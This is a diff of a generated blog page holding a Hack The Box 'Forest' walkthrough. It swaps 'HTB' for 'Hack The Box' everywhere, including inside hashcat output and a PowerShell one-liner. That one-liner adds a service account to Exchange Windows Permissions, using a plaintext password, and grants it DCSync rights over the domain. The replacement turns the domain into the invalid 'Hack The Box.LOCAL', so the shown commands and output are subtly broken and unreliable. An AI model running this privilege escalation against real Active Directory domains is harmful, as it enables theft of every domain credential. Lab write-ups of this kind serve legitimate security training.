@@ -8,11 +8,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Forest Walkthrough(HTB) &middot; Secure The Throne</title>
-  <meta name="title" content="Forest Walkthrough(HTB) &middot; Secure The Throne" />
+  <title>Forest Walkthrough(Hack The Box) &middot; Secure The Throne</title>
+  <meta name="title" content="Forest Walkthrough(Hack The Box) &middot; Secure The Throne" />
   
   <meta name="description" content="Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes." />
-  <meta name="keywords" content="Easy, windows, HTB, hacking, Active Directory, walkthrough, " />
+  <meta name="keywords" content="Easy, windows, Hack The Box, hacking, Active Directory, walkthrough, " />
   
   
   <link rel="canonical" href="http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/" />
@@ -71,7 +71,7 @@
   
   <meta property="og:url" content="http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/">
   <meta property="og:site_name" content="Secure The Throne">
-  <meta property="og:title" content="Forest Walkthrough(HTB)">
+  <meta property="og:title" content="Forest Walkthrough(Hack The Box)">
   <meta property="og:description" content="Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
@@ -80,7 +80,7 @@
     <meta property="article:modified_time" content="2025-03-07T00:00:00+00:00">
     <meta property="article:tag" content="Easy">
     <meta property="article:tag" content="Windows">
-    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Hack the Box">
     <meta property="article:tag" content="Hacking">
     <meta property="article:tag" content="Active Directory">
     <meta property="article:tag" content="Walkthrough">
@@ -89,7 +89,7 @@
   
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/featured.png">
-  <meta name="twitter:title" content="Forest Walkthrough(HTB)">
+  <meta name="twitter:title" content="Forest Walkthrough(Hack The Box)">
   <meta name="twitter:description" content="Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.">
 
   
@@ -98,8 +98,8 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Forest Walkthrough(HTB)",
-    "headline": "Forest Walkthrough(HTB)",
+    "name": "Forest Walkthrough(Hack The Box)",
+    "headline": "Forest Walkthrough(Hack The Box)",
     "description": "Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.",
     
     "inLanguage": "en",
@@ -114,10 +114,10 @@
     
     "dateModified": "2025-03-07T00:00:00\u002b00:00",
     
-    "keywords": ["Easy","windows","HTB","hacking","Active Directory","walkthrough"],
+    "keywords": ["Easy","windows","Hack The Box","hacking","Active Directory","walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1932"
+    "wordCount": "1940"
   }]
   </script>
 
@@ -634,7 +634,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Forest Walkthrough(HTB)
+      Forest Walkthrough(Hack The Box)
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -681,7 +681,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-07T00:00:00&#43;00:00">7 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1932 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">10 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-07T00:00:00&#43;00:00">7 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1940 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">10 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/Secure-The-Throne/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -756,10 +756,10 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/htb/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/hack-the-box/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    HTB
+    Hack the Box
   </span>
 </span>
   </span>
@@ -1069,7 +1069,7 @@
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
 389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: Hack The Box)
 464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  tcpwrapped
@@ -1285,12 +1285,12 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:96ff40e8c8c6d4249819d886c49788a1$......&lt;redacted&gt;:&lt;Password-Redacted&gt;
+$krb5asrep$23$svc-alfresco@Hack The Box.LOCAL:96ff40e8c8c6d4249819d886c49788a1$......&lt;redacted&gt;:&lt;Password-Redacted&gt;
                                                           
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
-Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:96ff40e8c8c6d4...fc3980
+Hash.Target......: $krb5asrep$23$svc-alfresco@Hack The Box.LOCAL:96ff40e8c8c6d4...fc3980
 Time.Started.....: Mon Jan 13 21:57:43 2025 (1 sec)
 Time.Estimated...: Mon Jan 13 21:57:44 2025 (0 secs)
 Kernel.Feature...: Pure Kernel
@@ -1385,7 +1385,7 @@ Info: Establishing connection to remote endpoint
 </span></span></code></pre></div><ul>
 <li>This is the one liner</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> Add-DomainGroupMember -Identity <span class="s1">&#39;Exchange Windows Permissions&#39;</span> -Members svc-alfresco<span class="p">;</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;htb\svc-alfresco&#34;</span><span class="p">;</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;s3rvice&#34;</span><span class="p">;</span> <span class="nv">$secstr</span> <span class="o">=</span> New-Object -TypeName System.Security.SecureString<span class="p">;</span> <span class="nv">$password</span>.ToCharArray<span class="o">()</span> <span class="p">|</span> ForEach-Object <span class="o">{</span><span class="nv">$secstr</span>.AppendChar<span class="o">(</span><span class="nv">$_</span><span class="o">)}</span><span class="p">;</span> <span class="nv">$cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$secstr</span><span class="p">;</span> Add-DomainObjectAcl -Credential <span class="nv">$Cred</span> -PrincipalIdentity <span class="s1">&#39;svc-alfresco&#39;</span> -TargetIdentity <span class="s1">&#39;HTB.LOCAL\Domain Admins&#39;</span> -Rights DCSync
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> Add-DomainGroupMember -Identity <span class="s1">&#39;Exchange Windows Permissions&#39;</span> -Members svc-alfresco<span class="p">;</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;htb\svc-alfresco&#34;</span><span class="p">;</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;s3rvice&#34;</span><span class="p">;</span> <span class="nv">$secstr</span> <span class="o">=</span> New-Object -TypeName System.Security.SecureString<span class="p">;</span> <span class="nv">$password</span>.ToCharArray<span class="o">()</span> <span class="p">|</span> ForEach-Object <span class="o">{</span><span class="nv">$secstr</span>.AppendChar<span class="o">(</span><span class="nv">$_</span><span class="o">)}</span><span class="p">;</span> <span class="nv">$cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$secstr</span><span class="p">;</span> Add-DomainObjectAcl -Credential <span class="nv">$Cred</span> -PrincipalIdentity <span class="s1">&#39;svc-alfresco&#39;</span> -TargetIdentity <span class="s1">&#39;Hack The Box.LOCAL\Domain Admins&#39;</span> -Rights DCSync
 </span></span></code></pre></div><ul>
 <li>Atlast I can run secrets dump to dump all those secrets</li>
 </ul>
@@ -1564,7 +1564,7 @@ Info: Establishing connection to remote endpoint
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;title=Forest%20Walkthrough%28HTB%29"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;title=Forest%20Walkthrough%28Hack%20The%20Box%29"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -1583,7 +1583,7 @@ Info: Establishing connection to remote endpoint
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;text=Forest%20Walkthrough%28HTB%29"
+      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;text=Forest%20Walkthrough%28Hack%20The%20Box%29"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -1601,7 +1601,7 @@ Info: Establishing connection to remote endpoint
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://api.whatsapp.com/send?text=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;resubmit=true&amp;title=Forest%20Walkthrough%28HTB%29"
+      href="https://api.whatsapp.com/send?text=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;resubmit=true&amp;title=Forest%20Walkthrough%28Hack%20The%20Box%29"
       title="Share via WhatsApp"
       aria-label="Share via WhatsApp"
       >
@@ -1620,7 +1620,7 @@ Info: Establishing connection to remote endpoint
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;description=Forest%20Walkthrough%28HTB%29"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;description=Forest%20Walkthrough%28Hack%20The%20Box%29"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -1639,7 +1639,7 @@ Info: Establishing connection to remote endpoint
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;resubmit=true&amp;title=Forest%20Walkthrough%28HTB%29"
+      href="https://reddit.com/submit/?url=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;resubmit=true&amp;title=Forest%20Walkthrough%28Hack%20The%20Box%29"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -1658,7 +1658,7 @@ Info: Establishing connection to remote endpoint
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;quote=Forest%20Walkthrough%28HTB%29"
+      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;quote=Forest%20Walkthrough%28Hack%20The%20Box%29"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1677,7 +1677,7 @@ Info: Establishing connection to remote endpoint
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;subject=Forest%20Walkthrough%28HTB%29"
+      href="mailto:?body=http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/&amp;subject=Forest%20Walkthrough%28Hack%20The%20Box%29"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1756,7 +1756,7 @@ Info: Establishing connection to remote endpoint
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Backend Walkthrough(HTB)</span
+                  >Backend Walkthrough(Hack The Box)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
